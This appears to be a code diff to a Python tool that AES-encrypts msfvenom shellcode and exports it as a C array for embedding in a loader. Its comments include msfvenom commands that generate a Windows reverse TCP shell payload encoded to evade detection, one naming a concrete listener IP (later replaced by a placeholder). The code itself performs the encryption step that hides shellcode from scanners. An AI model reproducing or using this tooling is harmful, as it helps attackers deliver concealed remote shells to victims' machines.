@@ -12,10 +12,10 @@ from Crypto.Cipher import AES
 FILE_PATH = os.path.dirname(__file__) + '/files/'
 SHELLCODE_FILE = FILE_PATH + "mess.raw"         # Default shellcode file
 KEY = urandom(8)                                # Random urandom key
-#msfvenom -p windows/x64/messagebox TEXT='Hello World!' -f raw -o mess.raw
-#msfvenom -p windows/x64/shell_reverse_tcp LHOST=81.230.95.134 LPORT=443 -f raw -b
-# '\x00\x0a\x0d\x20' -e x86/shikata_ga_nai -o mess.raw
-#python .\schellcodeencrypt.py file/mess.raw
+#generate shellcode: msfvenom -p windows/x64/messagebox TEXT='Hello World!' -f raw -o mess.raw
+#generate shellcode: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<listner IP>
+#LPORT=443 -f raw -b '\x00\x0a\x0d\x20' -e x86/shikata_ga_nai -o mess.raw
+#Shellcode used by this script must be in ".raw" format
 
 def convert_to_c_array(in_data, array_name):
     """Convert data to c array that later can be included in a c program'"""
@@ -35,7 +35,7 @@ def save_to_c_file(file_name, data_to_save, array_name):
     with open(file_name, "w", encoding="utf-8") as file:
         c_array_code = convert_to_c_array(data_to_save, array_name)
         file.write(c_array_code)
-    print(f"{array_name} saved in {file_name}")
+    print(f"C array '{array_name}' saved in '{file_name}'.")
 
 
 def add_padding2(shellcode_to_pad):    # Additional function to try if problem injecting shellcode
@@ -56,12 +56,15 @@ def add_padding(shellcode_pad):
 
 def encrypt_shellcode(shellcode_to_encrypt, key):
     """Function that encrypts shellcode with AES encryption"""
-    sha256_key = hashlib.sha256(key).digest()
-    #block_size = bytes(16)
-    shellcode_padded = add_padding(shellcode_to_encrypt)
-    cipher = AES.new(sha256_key, AES.MODE_CBC, bytes(16))
-    return cipher.encrypt(shellcode_padded)
-
+    try:
+        sha256_key = hashlib.sha256(key).digest()
+        shellcode_padded = add_padding(shellcode_to_encrypt)
+        cipher = AES.new(sha256_key, AES.MODE_CBC, bytes(16))
+        print("Shellcode encrypted with AES encryption.")
+        return cipher.encrypt(shellcode_padded)
+    except:
+        print("Error: Something unexcepted happend during encryption.")
+        return False
 
 def shellcode_encrypter(shellcode_file):
     """Function that encrypts shellcode and saves the key and encrypted shellcode"""
